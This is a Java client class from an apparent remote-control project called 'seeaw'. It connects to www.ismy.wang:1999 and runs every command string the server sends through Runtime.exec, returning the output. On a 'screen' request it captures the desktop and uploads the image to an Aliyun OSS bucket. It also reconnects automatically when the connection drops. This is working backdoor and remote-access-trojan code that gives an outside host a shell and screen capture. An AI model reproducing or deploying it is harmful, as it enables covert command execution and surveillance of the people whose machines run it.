package wang.ismy.seeaw;

import com.aliyun.oss.ClientException;
import com.aliyun.oss.OSSClient;
import com.aliyun.oss.OSSException;
import com.aliyun.oss.model.CompleteMultipartUploadResult;
import com.aliyun.oss.model.UploadFileRequest;
import com.aliyun.oss.model.UploadFileResult;
import wang.ismy.seeaw.listener.ClientLiveListener;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.concurrent.*;

public class MyClient extends Client {

    private int live=10;

    private boolean flag=true;

    private ClientLiveListener clientLiveListener;
    public MyClient(String host, int port) {
        super(host,port);
        clientLiveListener=new ClientLiveListener(this);
        clientLiveListener.start();
        new Live().start();
    }

    public void receive(final String msg) {

        System.err.println("客户端收到了消息:"+msg);
        DTO dto=new DTO();
        try {
            if(msg.equals("screen")){
                String url=screenAndUpload();
                dto.setMsg("screen");
                dto.addParams("ret",url);
                send(dto.toString());
                return;
            }else if(msg.equals("heart")){
                live++;
                return;
            }

            String result;
            FutureTask<String> futureTask = new FutureTask<String>(new Callable<String>() {

                @Override
                public String call() throws Exception {
                    return exe(msg);
                }
            });

            Executors.newSingleThreadExecutor().execute(futureTask);
            try {
                result = futureTask.get(10000, TimeUnit.MILLISECONDS);
            } catch (Exception e) {
                //e.printStackTrace();
                futureTask.cancel(true);
                result = "调用超时";
            }
            dto.setMsg("cmd").addParams("ret",result);

            send(dto.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public String exe(String cmd){

        Runtime runtime=Runtime.getRuntime();
        try {
            BufferedReader reader=new BufferedReader(new InputStreamReader(runtime.exec(cmd).getInputStream(),"GBK"));

            String str=null;
            StringBuilder sb=new StringBuilder();
            while((str=reader.readLine())!=null){
                sb.append(str+"\n");
            }
            return sb.toString();
        } catch (IOException e) {
            return e.getMessage();
        }
    }


    private String screenAndUpload(){
        BufferedImage bfImage = null;
        try {
            Robot robot = new Robot();
            bfImage = robot.createScreenCapture(new Rectangle(0, 0, 1366, 768));
            File file=new File("screen.png");
            ImageIO.write(bfImage,"png",file);

            return upload(file.getAbsolutePath());
        } catch (AWTException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    private String upload(String uri){

        String endpoint = "oss-cn-qingdao.aliyuncs.com";

        String bucketName = "ismy1";
        String key = "<downloadKey>";
        String uploadFile = "<uploadFile>";
        key="screen/"+System.currentTimeMillis();

        String back=uri.substring(uri.lastIndexOf("."),uri.length());
        key+=back;
        uploadFile=uri;
        OSSClient ossClient = new OSSClient(endpoint, accessKeyId, accessKeySecret);
        try {
            UploadFileRequest uploadFileRequest = new UploadFileRequest(bucketName, key);
            // 待上传的本地文件
            uploadFileRequest.setUploadFile(uploadFile);
            // 设置并发下载数，默认1
            uploadFileRequest.setTaskNum(5);
            // 设置分片大小，默认100KB
            uploadFileRequest.setPartSize(1024 * 1024 * 1);
            // 开启断点续传，默认关闭
            uploadFileRequest.setEnableCheckpoint(true);

            UploadFileResult uploadResult = ossClient.uploadFile(uploadFileRequest);

            CompleteMultipartUploadResult multipartUploadResult =
                    uploadResult.getMultipartUploadResult();
            System.out.println(multipartUploadResult.getETag());

        } catch (OSSException oe) {
            System.out.println("Caught an OSSException, which means your request made it to OSS, "
                    + "but was rejected with an error response for some reason.");
            System.out.println("Error Message: " + oe.getErrorCode());
            System.out.println("Error Code:       " + oe.getErrorCode());
            System.out.println("Request ID:      " + oe.getRequestId());
            System.out.println("Host ID:           " + oe.getHostId());
        } catch (ClientException ce) {
            System.out.println("Caught an ClientException, which means the client encountered "
                    + "a serious internal problem while trying to communicate with OSS, "
                    + "such as not being able to access the network.");
            System.out.println("Error Message: " + ce.getMessage());
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            ossClient.shutdown();
        }
        return "https://"+bucketName+"."+endpoint+"/"+key;
    }

    public int getLive() {
        return live;
    }

    public void setLive(int live) {
        this.live = live;
    }

    class Live extends Thread{

        @Override
        public void run(){

            while(flag){
                try {
                    Thread.sleep(2000);
                    live--;
                    if(live<0){
                        System.err.println("与服务器失去连接，五秒后重新连接");
                        live=10;
                        flag=false;
                        clientLiveListener.kill();
                        new MyClient("www.ismy.wang",1999);

                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
